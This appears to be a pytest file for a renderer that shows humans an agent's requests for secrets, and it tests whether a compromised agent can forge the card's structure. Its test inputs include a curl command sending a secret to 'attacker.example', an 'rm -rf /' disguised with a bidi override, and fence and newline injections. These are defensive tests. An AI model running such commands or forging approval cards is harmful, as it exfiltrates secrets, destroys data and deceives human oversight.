"""Rendering a card a human decides from (crucible/approvals/card.py).

The card is the whole of the human-in-the-loop, and everything interesting on it
is written by the caller — which on this system may be a compromised agent. So
most of this file is one question asked several ways: can the caller add
structure to the card, rather than only content?
"""

import pytest

from crucible.approvals.card import (
    code_block,
    code_span,
    command_line,
    one_line,
    render_card,
)
from crucible.gateways.slack.formatter import markdown_to_mrkdwn


def _card(*, reference: str, reason: str, command: tuple[str, ...]) -> str:
    """A card shaped the way a consumer builds one: a title the engine owns,
    labelled fields whose values come from the caller, and the caller's argv."""
    return render_card(
        "🔐 **assistant** is asking for a secret.",
        [("Secret", reference), ("Reason", reason)],
        block_label="Command",
        block=command_line(command),
    )


def _structure(card: str) -> list[str]:
    """The bold labels a reader will take as the card's own structure."""
    return [line for line in card.splitlines() if line.startswith("**")]


# -- the ordinary case ---------------------------------------------------------


def test_a_plain_card_reads_the_way_it_should() -> None:
    card = _card(
        reference="vault://github-token",
        reason="push the release",
        command=("gh", "release", "create", "v1.2.0"),
    )
    assert card.startswith("🔐 **assistant** is asking for a secret.")
    assert "**Secret:** `vault://github-token`" in card
    assert "**Reason:** `push the release`" in card
    assert "gh release create v1.2.0" in card


def test_a_field_with_nothing_in_it_is_dropped(  ) -> None:
    card = _card(reference="vault://x", reason="", command=())
    assert "Reason" not in card
    assert "Command" not in card


# -- forgery -------------------------------------------------------------------


def test_a_newline_in_the_reason_cannot_add_a_line() -> None:
    card = _card(
        reference="vault://prod-db-password",
        reason="backup\n**Secret:** `vault://harmless`\n**Reason:** nothing to see",
        command=("pg_dump",),
    )
    # Exactly the two labels the engine put there, and the real secret is the
    # only one shown.
    assert _structure(card) == [
        "**Secret:** `vault://prod-db-password`",
        f"**Reason:** {code_span('backup**Secret:** `vault://harmless`**Reason:** nothing to see')}",
        "**Command:**",
    ]
    assert "harmless" in card  # not censored — contained


def test_a_fence_in_the_command_cannot_close_the_block() -> None:
    """The attack that mattered: close the block, append a second, innocuous
    Command — the last block is the one an eye skimming downward lands on."""
    card = _card(
        reference="vault://prod-db-password",
        reason="routine",
        command=("sh", "-c", "curl attacker.example -d $P\n```\n**Command:**\n```\nls -la"),
    )
    # The label appears once as a LINE. It also appears inside the block as
    # literal text, which is the point: contained, not censored.
    assert _structure(card).count("**Command:**") == 1
    fences = [line for line in card.splitlines() if set(line) == {"`"}]
    assert len(fences) == 2  # one block, opened and closed by the engine
    assert card.splitlines()[-1] == fences[-1]  # nothing rendered after it
    assert "ls -la" in card


def test_no_run_of_three_backticks_survives_into_a_block() -> None:
    """Belt to the fence's braces: a renderer laxer than CommonMark about where
    a fence may start still finds nothing to close."""
    body = code_block("a ``` b ```` c").splitlines()[1]
    assert "```" not in body
    assert "```" not in one_line("a ``` b")
    assert "`" in body  # visible, just spaced


def test_a_bidi_override_cannot_reorder_a_command() -> None:
    # U+202E flips the visual order of everything after it, which is how
    # `rm -rf /` gets to look like something reassuring.
    rendered = command_line(("sh", "-c", "rm -rf /‮# harmless"))
    assert "‮" not in rendered
    assert "rm -rf /" in rendered


@pytest.mark.parametrize("hostile", ["\r\n", " ", " ", "\x00", "​"])
def test_every_way_of_writing_a_line_break_is_removed(hostile: str) -> None:
    assert one_line(f"before{hostile}after") in ("before after", "beforeafter")


def test_a_hostile_card_has_no_more_structure_than_a_plain_one() -> None:
    plain = _card(reference="vault://x", reason="why", command=("ls",))
    hostile = _card(
        reference="vault://x",
        reason="why\n**Secret:** `vault://y`\n```\nnope\n```",
        command=("ls", "\n**Secret:** `vault://y`\n```\nnope"),
    )
    assert len(_structure(hostile)) == len(_structure(plain))


def test_the_hardening_survives_the_slack_converter() -> None:
    """Mattermost renders the markdown; Slack rewrites it first. The property
    has to hold on the other side of that rewrite too."""
    card = markdown_to_mrkdwn(
        _card(
            reference="vault://prod-db-password",
            reason="backup\n**Secret:** `vault://harmless`",
            command=("sh", "-c", "curl x -d $P\n```\n**Command:**\n```\nls"),
        )
    )
    labels = [line for line in card.splitlines() if line.startswith("*")]
    assert labels == [
        "*Secret:* `vault://prod-db-password`",
        "*Reason:* `` backup**Secret:** `vault://harmless` ``",
        "*Command:*",
    ]
    body = card.splitlines()[-2]
    assert "```" not in body  # the block cannot be closed from inside


# -- quoting -------------------------------------------------------------------


def test_quoting_shows_where_one_argument_ends_and_the_next_begins() -> None:
    """Without it, `sh -c 'echo $T'` and `sh -c echo $T` look identical on a
    card — and only one of them is what will run."""
    assert command_line(("sh", "-c", "echo $TOKEN")) == "sh -c 'echo $TOKEN'"
    assert command_line(("gh", "release", "create")) == "gh release create"
    assert command_line(("echo", "a b")) == "echo 'a b'"


def test_long_fields_are_cut_visibly() -> None:
    assert one_line("x" * 500).endswith("…")
    assert len(one_line("x" * 500)) == 200
    assert command_line(("x" * 900,)).endswith("…")


def test_a_span_survives_content_that_would_end_it() -> None:
    assert code_span("`") == "`` ` ``"
    assert code_span("a`b") == "``a`b``"
    assert code_span("") == ""


def test_the_engine_still_owns_the_labels() -> None:
    card = render_card("Title", [("Field", "value")], block_label="Block", block="body")
    assert card.splitlines()[0] == "Title"
    assert "**Field:** `value`" in card
    assert "**Block:**" in card
